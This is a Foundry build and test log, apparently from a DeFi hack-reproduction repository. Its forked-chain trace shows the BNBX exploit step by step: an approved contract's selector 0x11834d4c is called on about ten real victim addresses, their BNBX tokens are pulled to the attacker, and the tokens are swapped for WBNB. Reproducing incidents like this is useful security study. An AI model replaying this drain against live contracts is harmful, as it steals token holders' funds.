Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.16s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-04/BNBX_exp.sol:15:5:
   |
15 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-04/BNBX_exp.sol:49:16:
   |
49 |                BNBX_0x389a.call(abi.encodeWithSelector(bytes4(0x11834d4c), victims[i]));
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> src/test/2024-04/BNBX_exp.sol:61:10:
   |
61 |         (uint256 reserveWBNB_after, uint256 reserveTOKEN_after,) = WBNB_BNBX_LpPool.getReserves();
   |          ^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20453)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20453] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 386.65ms (236.55µs CPU time)

Ran 1 test for src/test/2024-04/BNBX_exp.sol:ContractTest
[PASS] testExploit() (gas: 344440)
Logs:
  Attacker WBNB balance before attack: 0
  Attacker WBNB balance after attack: 0.467231121465031107

Traces:
  [435815] ContractTest::testExploit()
    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker WBNB balance before attack", val: 0)
    ├─ [2794] BNBX::allowance(0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146) [staticcall]
    │   └─ ← [Return] 12777719215277777684289 [1.277e22]
    ├─ [41414] BNBX_0x389a::11834d4c(000000000000000000000000e71f1d71afe531bcd9b89f82d8a44b04f73b7146)
    │   ├─ [598] BNBX::balanceOf(0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146) [staticcall]
    │   │   └─ ← [Return] 12777719215277777684289 [1.277e22]
    │   ├─ [37321] BNBX::transferFrom(0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12777719215277777684289 [1.277e22])
    │   │   ├─ emit Transfer(from: 0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12777719215277777684289 [1.277e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xe497e225407b5a305F5e359973bebD4A1986CF7e, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xe497e225407b5a305F5e359973bebD4A1986CF7e) [staticcall]
    │   └─ ← [Return] 2001152525412742491896 [2.001e21]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000e497e225407b5a305f5e359973bebd4a1986cf7e)
    │   ├─ [598] BNBX::balanceOf(0xe497e225407b5a305F5e359973bebD4A1986CF7e) [staticcall]
    │   │   └─ ← [Return] 2001152525412742491896 [2.001e21]
    │   ├─ [9421] BNBX::transferFrom(0xe497e225407b5a305F5e359973bebD4A1986CF7e, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2001152525412742491896 [2.001e21])
    │   │   ├─ emit Transfer(from: 0xe497e225407b5a305F5e359973bebD4A1986CF7e, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2001152525412742491896 [2.001e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c) [staticcall]
    │   └─ ← [Return] 16858214921979176887151 [1.685e22]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000d1616bfb6a2009ee33db9fcc3c646332e001797c)
    │   ├─ [598] BNBX::balanceOf(0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c) [staticcall]
    │   │   └─ ← [Return] 16858214921979176887151 [1.685e22]
    │   ├─ [9421] BNBX::transferFrom(0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16858214921979176887151 [1.685e22])
    │   │   ├─ emit Transfer(from: 0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16858214921979176887151 [1.685e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC) [staticcall]
    │   └─ ← [Return] 1368630703559315993885 [1.368e21]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000cc079f627311657c8a4b3d8eda8742352b9dd4ac)
    │   ├─ [598] BNBX::balanceOf(0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC) [staticcall]
    │   │   └─ ← [Return] 1368630703559315993885 [1.368e21]
    │   ├─ [9421] BNBX::transferFrom(0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1368630703559315993885 [1.368e21])
    │   │   ├─ emit Transfer(from: 0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1368630703559315993885 [1.368e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C) [staticcall]
    │   └─ ← [Return] 24680308356559309914069 [2.468e22]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000b91af0ce8bbd4b597eda7b5194231aa1b487b85c)
    │   ├─ [598] BNBX::balanceOf(0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C) [staticcall]
    │   │   └─ ← [Return] 24680308356559309914069 [2.468e22]
    │   ├─ [9421] BNBX::transferFrom(0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24680308356559309914069 [2.468e22])
    │   │   ├─ emit Transfer(from: 0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24680308356559309914069 [2.468e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xb53905E26CA1F0106107772C1f48e6D035B4E0F1, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xb53905E26CA1F0106107772C1f48e6D035B4E0F1) [staticcall]
    │   └─ ← [Return] 4745515950834578358446 [4.745e21]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000b53905e26ca1f0106107772c1f48e6d035b4e0f1)
    │   ├─ [598] BNBX::balanceOf(0xb53905E26CA1F0106107772C1f48e6D035B4E0F1) [staticcall]
    │   │   └─ ← [Return] 4745515950834578358446 [4.745e21]
    │   ├─ [9421] BNBX::transferFrom(0xb53905E26CA1F0106107772C1f48e6D035B4E0F1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4745515950834578358446 [4.745e21])
    │   │   ├─ emit Transfer(from: 0xb53905E26CA1F0106107772C1f48e6D035B4E0F1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4745515950834578358446 [4.745e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D) [staticcall]
    │   └─ ← [Return] 4168617310810762880280 [4.168e21]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000afa24dee0c2aa82295e1d0e885eb44a81306442d)
    │   ├─ [598] BNBX::balanceOf(0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D) [staticcall]
    │   │   └─ ← [Return] 4168617310810762880280 [4.168e21]
    │   ├─ [9421] BNBX::transferFrom(0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4168617310810762880280 [4.168e21])
    │   │   ├─ emit Transfer(from: 0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4168617310810762880280 [4.168e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0x98C9440822B4A8F9A24E7ee34222E566F08c15E4, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0x98C9440822B4A8F9A24E7ee34222E566F08c15E4) [staticcall]
    │   └─ ← [Return] 3000219852976221130534 [3e21]
    ├─ [11514] BNBX_0x389a::11834d4c(00000000000000000000000098c9440822b4a8f9a24e7ee34222e566f08c15e4)
    │   ├─ [598] BNBX::balanceOf(0x98C9440822B4A8F9A24E7ee34222E566F08c15E4) [staticcall]
    │   │   └─ ← [Return] 3000219852976221130534 [3e21]
    │   ├─ [9421] BNBX::transferFrom(0x98C9440822B4A8F9A24E7ee34222E566F08c15E4, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3000219852976221130534 [3e21])
    │   │   ├─ emit Transfer(from: 0x98C9440822B4A8F9A24E7ee34222E566F08c15E4, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3000219852976221130534 [3e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0x830a727B59477373Cf7bbB66fB4abf22afBBdF56, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0x830a727B59477373Cf7bbB66fB4abf22afBBdF56) [staticcall]
    │   └─ ← [Return] 13035224735091310894576 [1.303e22]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000830a727b59477373cf7bbb66fb4abf22afbbdf56)
    │   ├─ [598] BNBX::balanceOf(0x830a727B59477373Cf7bbB66fB4abf22afBBdF56) [staticcall]
    │   │   └─ ← [Return] 13035224735091310894576 [1.303e22]
    │   ├─ [9421] BNBX::transferFrom(0x830a727B59477373Cf7bbB66fB4abf22afBBdF56, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13035224735091310894576 [1.303e22])
    │   │   ├─ emit Transfer(from: 0x830a727B59477373Cf7bbB66fB4abf22afBBdF56, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13035224735091310894576 [1.303e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2794] BNBX::allowance(0x741b7870DBDCd8CceD6ae19bABA4Da814101484d, BNBX_0x389a: [0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2598] BNBX::balanceOf(0x741b7870DBDCd8CceD6ae19bABA4Da814101484d) [staticcall]
    │   └─ ← [Return] 21901768749999999999717 [2.19e22]
    ├─ [11514] BNBX_0x389a::11834d4c(000000000000000000000000741b7870dbdcd8cced6ae19baba4da814101484d)
    │   ├─ [598] BNBX::balanceOf(0x741b7870DBDCd8CceD6ae19bABA4Da814101484d) [staticcall]
    │   │   └─ ← [Return] 21901768749999999999717 [2.19e22]
    │   ├─ [9421] BNBX::transferFrom(0x741b7870DBDCd8CceD6ae19bABA4Da814101484d, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21901768749999999999717 [2.19e22])
    │   │   ├─ emit Transfer(from: 0x741b7870DBDCd8CceD6ae19bABA4Da814101484d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 21901768749999999999717 [2.19e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2893] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::getReserves() [staticcall]
    │   └─ ← [Return] 207770608109164212928 [2.077e20], 1388262840679182775389803 [1.388e24], 1714233542 [1.714e9]
    ├─ [598] BNBX::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 104537372322501196234843 [1.045e23]
    ├─ [135086] BNBX::transfer(0xAa3f145f854e12F1566548c01e74c1b9d98c634d, 104537372322501196234843 [1.045e23])
    │   ├─ [893] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::getReserves() [staticcall]
    │   │   └─ ← [Return] 207770608109164212928 [2.077e20], 1388262840679182775389803 [1.388e24], 1714233542 [1.714e9]
    │   ├─ [275] 0x10ED43C718714eb63d5aA57B78B54704E256024E::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [2534] WBNB::balanceOf(0xAa3f145f854e12F1566548c01e74c1b9d98c634d) [staticcall]
    │   │   └─ ← [Return] 207770608109164212928 [2.077e20]
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BNBX: [0xF662457774bb0729028EA681BB2C001790999999], value: 3136121169675035887045 [3.136e21])
    │   ├─ [275] 0x10ED43C718714eb63d5aA57B78B54704E256024E::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [101827] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForETH(3136780869445825157094 [3.136e21], 0, [0xF662457774bb0729028EA681BB2C001790999999, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x283c59a399b6b767B2A2b203178F088BF18849AE, 1714233614 [1.714e9])
    │   │   ├─ [893] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 207770608109164212928 [2.077e20], 1388262840679182775389803 [1.388e24], 1714233542 [1.714e9]
    │   │   ├─ [10560] BNBX::transferFrom(BNBX: [0xF662457774bb0729028EA681BB2C001790999999], 0xAa3f145f854e12F1566548c01e74c1b9d98c634d, 3136780869445825157094 [3.136e21])
    │   │   │   ├─ emit Transfer(from: BNBX: [0xF662457774bb0729028EA681BB2C001790999999], to: 0xAa3f145f854e12F1566548c01e74c1b9d98c634d, value: 3136780869445825157094 [3.136e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [62406] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::swap(467231121465031107 [4.672e17], 0, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x)
    │   │   │   ├─ [27962] WBNB::transfer(0x10ED43C718714eb63d5aA57B78B54704E256024E, 467231121465031107 [4.672e17])
    │   │   │   │   ├─ emit Transfer(from: 0xAa3f145f854e12F1566548c01e74c1b9d98c634d, to: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 467231121465031107 [4.672e17])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xAa3f145f854e12F1566548c01e74c1b9d98c634d) [staticcall]
    │   │   │   │   └─ ← [Return] 207303376987699181821 [2.073e20]
    │   │   │   ├─ [598] BNBX::balanceOf(0xAa3f145f854e12F1566548c01e74c1b9d98c634d) [staticcall]
    │   │   │   │   └─ ← [Return] 1391399621548628600546897 [1.391e24]
    │   │   │   ├─ emit Sync(reserve0: 207303376987699181821 [2.073e20], reserve1: 1391399621548628600546897 [1.391e24])
    │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 3136780869445825157094 [3.136e21], amount0Out: 467231121465031107 [4.672e17], amount1Out: 0, to: 0x10ED43C718714eb63d5aA57B78B54704E256024E)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [9223] WBNB::withdraw(467231121465031107 [4.672e17])
    │   │   │   ├─ [83] 0x10ED43C718714eb63d5aA57B78B54704E256024E::fallback{value: 467231121465031107}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 467231121465031107 [4.672e17])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x283c59a399b6b767B2A2b203178F088BF18849AE::fallback{value: 467231121465031107}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] [3136780869445825157094 [3.136e21], 467231121465031107 [4.672e17]]
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAa3f145f854e12F1566548c01e74c1b9d98c634d, value: 101401251152826160347798 [1.014e23])
    │   └─ ← [Return] true
    ├─ [893] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::getReserves() [staticcall]
    │   └─ ← [Return] 207303376987699181821 [2.073e20], 1391399621548628600546897 [1.391e24], 1714233614 [1.714e9]
    ├─ [1021] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountOut(3136780869445825157094 [3.136e21], 1388262840679182775389803 [1.388e24], 207770608109164212928 [2.077e20]) [staticcall]
    │   └─ ← [Return] 467231121465031107 [4.672e17]
    ├─ [38322] 0xAa3f145f854e12F1566548c01e74c1b9d98c634d::swap(467231121465031107 [4.672e17], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 467231121465031107 [4.672e17])
    │   │   ├─ emit Transfer(from: 0xAa3f145f854e12F1566548c01e74c1b9d98c634d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 467231121465031107 [4.672e17])
    │   │   └─ ← [Return] true
    │   ├─ [534] WBNB::balanceOf(0xAa3f145f854e12F1566548c01e74c1b9d98c634d) [staticcall]
    │   │   └─ ← [Return] 206836145866234150714 [2.068e20]
    │   ├─ [598] BNBX::balanceOf(0xAa3f145f854e12F1566548c01e74c1b9d98c634d) [staticcall]
    │   │   └─ ← [Return] 1492800872701454760894695 [1.492e24]
    │   ├─ emit Sync(reserve0: 206836145866234150714 [2.068e20], reserve1: 1492800872701454760894695 [1.492e24])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 101401251152826160347798 [1.014e23], amount0Out: 467231121465031107 [4.672e17], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 467231121465031107 [4.672e17]
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after attack", val: 467231121465031107 [4.672e17], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.48s (2.78s CPU time)

Ran 2 test suites in 3.75s (3.87s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
